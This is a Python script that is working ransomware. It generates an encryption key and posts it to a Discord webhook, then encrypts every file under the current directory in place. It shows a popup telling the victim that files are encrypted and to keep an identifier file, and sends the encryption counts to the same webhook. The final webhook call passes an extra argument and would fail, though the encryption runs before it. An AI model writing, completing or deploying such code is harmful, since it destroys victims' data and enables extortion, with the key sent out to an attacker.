import os
import base64
import requests
import uuid
import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet

def generate_key():
    """Generates a key for encryption and returns it."""
    return Fernet.generate_key()

def encrypt_file(file_path, fernet):
    """Encrypts a single file."""
    try:
        with open(file_path, 'rb') as file:
            original = file.read()
        
        encrypted = fernet.encrypt(original)
        
        with open(file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

        return True
    except Exception as e:
        print(f"Failed to encrypt {file_path}: {e}")
        return False

def walk_and_encrypt(directory, fernet):
    """Walks through the directory and encrypts all files."""
    file_count = 0
    folder_count = 0

    for dirpath, dirnames, filenames in os.walk(directory):
        # Encrypt all files in the current directory
        for filename in filenames:
            file_path = os.path.join(dirpath, filename)
            if encrypt_file(file_path, fernet):
                file_count += 1

        # Count all subdirectories
        folder_count += len(dirnames)

    return file_count, folder_count

def generate_identifier_code():
    """Generates a random identifier code and returns it."""
    return str(uuid.uuid4())

def save_identifier_to_file(identifier_code):
    """Saves the identifier code to a text file and returns the file path."""
    file_path = os.path.join(os.getcwd(), "identifier_code.txt")
    with open(file_path, 'w') as file:
        file.write(f"Identifier Code: {identifier_code}\n")
    return file_path

def send_info_to_discord(webhook_url, file_count, folder_count, identifier_code):
    message = (
        f"Files encrypted: {file_count}\n"
        f"Folders encrypted: {folder_count}\n"
        f"Identifier Code: {identifier_code}"
    )
    data = {
        "content": message
    }
    response = requests.post(webhook_url, json=data)
    if response.status_code == 204:
        print("Key and stats sent successfully to Discord.")
    else:
        print(f"Failed to send data to Discord. Status Code: {response.status_code}")
        
def send_key_to_discord(webhook_url, key):
    """Sends the encryption key, stats, and identifier code to a Discord webhook."""
    encoded_key = base64.urlsafe_b64encode(key).decode()  # Encode key to send over the webhook
    message = (
        f"Encryption Key: {encoded_key}\n"
    )
    data = {
        "content": message
    }
    response = requests.post(webhook_url, json=data)
    if response.status_code == 204:
        print("Key and stats sent successfully to Discord.")
    else:
        print(f"Failed to send data to Discord. Status Code: {response.status_code}")

def notify_user(file_path):
    """Displays a notification to the user with the path to the identifier file."""
    root = tk.Tk()
    root.withdraw()  # Hide the root window
    message = (
        f"Some of your files have been encrypted.\n\n"
        f"Keep the file ({file_path}) if you want to decrypt them later."
    )
    messagebox.showinfo("Files Encrypted", message)

def main():
    # Replace with your Discord webhook URL
    webhook_url = "YOUR_WEBHOOK_URL"
    
    # Generate encryption key
    key = generate_key()
    fernet = Fernet(key)
    
    send_key_to_discord(webhook_url, key)

    # Encrypt all files in the current directory and subdirectories
    current_directory = os.getcwd()
    file_count, folder_count = walk_and_encrypt(current_directory, fernet)
    
    # Generate a unique identifier code
    identifier_code = generate_identifier_code()
    
    # Save the identifier code to a file
    identifier_file_path = save_identifier_to_file(identifier_code)
    
    # Notify the user about the encryption and the location of the identifier file
    notify_user(identifier_file_path)
    
    # Send the key, encryption stats, and identifier code to the Discord webhook
    send_info_to_discord(webhook_url, key, file_count, folder_count, identifier_code)

if __name__ == "__main__":
    main()
